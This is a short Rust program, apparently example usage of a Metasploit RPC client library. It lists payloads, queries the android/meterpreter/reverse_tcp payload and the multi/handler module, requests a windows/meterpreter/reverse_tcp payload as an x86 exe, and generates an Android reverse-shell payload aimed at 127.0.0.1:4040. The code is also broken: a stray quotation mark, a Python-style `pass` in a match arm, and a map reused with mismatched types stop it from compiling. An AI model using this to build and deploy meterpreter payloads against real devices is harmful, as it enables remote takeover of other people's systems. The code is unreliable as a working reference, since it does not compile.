use metasploit::client::Client;
use metasploit::msf::modules;
use std::collections::HashMap;
use metasploit::value::Value;
fn main() {
    let client=Client::new("127.0.0.1",55552,"user","password",true);
    let list=modules::list::new(client.clone());
    println!("{:?}",list.payloads().unwrap());
    println!("{:?}",modules::info(client.clone(),"payload","android/meterpreter/reverse_tcp").unwrap());
    let comp=modules::compactible::new("multi/handler",client.clone());
    println!("{:?}",comp.payload().unwrap());
    println!("{:?}",comp.sessions().unwrap());
    println!("{:?}",comp.target_payloads(1).unwrap());
    println!("{:?}",modules::option(client.clone(),"payload","android/meterpreter/reverse_tcp"").unwrap());
    let mut dat=HashMap::new();
    dat.insert("format".to_string(),"exe".to_string());
    dat.insert("arch".to_string(),"x86".to_string());
    match modules::encoder(client.clone(),"multi/handler","windows/meterpreter/reverse_tcp",dat) {
        Ok(ref val) => {
            println!("{:?}",val);
        },
        Err(ref val) => {
            println!("{}",val.error_string);
        },
    }
    dat=HashMap::new();
    dat.insert("LHOST","127.0.0.1");
    dat.insert("LPORT","4040");
    match modules::execute(client.clone(),"payload","android/meterpreter/reverse_tcp",dat).unwrap() {
        Value::Binary(ref val) => println!("{}",String::from_utf8_lossy(&val)),
            _ => pass,
        }
}
